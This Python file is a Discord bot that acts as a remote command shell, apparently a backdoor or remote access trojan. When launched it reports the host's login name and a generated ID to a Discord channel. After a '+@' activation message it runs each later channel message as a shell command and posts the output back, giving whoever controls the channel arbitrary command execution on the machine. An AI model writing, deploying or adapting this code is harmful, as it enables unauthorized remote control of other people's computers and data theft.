import os
from dotenv import load_dotenv
load_dotenv('.env')
#user variables here
CHANNEL = os.environ.get("CHANNEL")
TOKEN = os.environ.get("TOKEN")

import discord
import time
import random
import threading
import subprocess
import asyncio
import concurrent.futures
start_time = int(time.time())
id = 0


def executer(message,bot):
    cmd = subprocess.run(message.content, capture_output=True,shell=True,timeout=30)
    out = cmd.stdout.decode()
    out += cmd.stderr.decode()
    print(out)
    bot.loop.create_task(message.channel.send(f"```{out}```",reference=message))
    return


def id_managing():
    global id
    if os.path.exists(".id"):
        f = open(".id","r")
        raw = f.read()
        f.close()
        id = raw
    else:
        id = GenerateID()
        f = open(".id","w")
        f.write(id)
        f.close()

id_managing()
def GenerateID():
    rand_seed = random.randint(0,65536)
    t = (rand_seed,os.getlogin())
    hash_id = t.__hash__()
    hash_id = hex(abs(hash_id))
    print(hash_id)
    return hash_id

class MyClient(discord.Client):
    global id
    global CHANNEL
    id_managing()
    async def on_ready(self):
        print(f'Logged on as {self.user}!')
        channel = self.get_channel(int(CHANNEL))
        await channel.send(f"@everyone new user!\n`{os.getlogin()}` : ***{id}***")
        self.in_session = False

    async def on_message(self, message):
        print(f'Message from {message.author}: {message.content} : {message.channel}')
        if message.author != self.user:
            if self.in_session:
                if message.content.startswith("-@") and (message.content[2:] == os.getlogin() or message.content[2:] == id):
                    self.in_session = False
                    await message.channel.send(f"```diff\n-{os.getlogin()} has stopped listening for commands!\n```",reference=message)
                    return
                else:
                    t = threading.Thread(target=executer,args=(message,self,))
                    t.start()
            elif message.content.startswith("+@"):
                if (message.content[2:] == os.getlogin() or message.content[2:] == id):
                    self.in_session = True
                    await message.channel.send(f"```diff\n+{os.getlogin()} is now listening for commands!\n```",reference=message)
                    return

            #executer(message,self)

            #await message.channel.send(f"`{os.getlogin()}` `{id}`")
    async def on_subtask_completed(self,message,out):
        await message.channel.send(f"```{out}```",reference=message)

intents = discord.Intents.default()
intents.message_content = True

client = MyClient(intents=intents)
client.run(TOKEN)
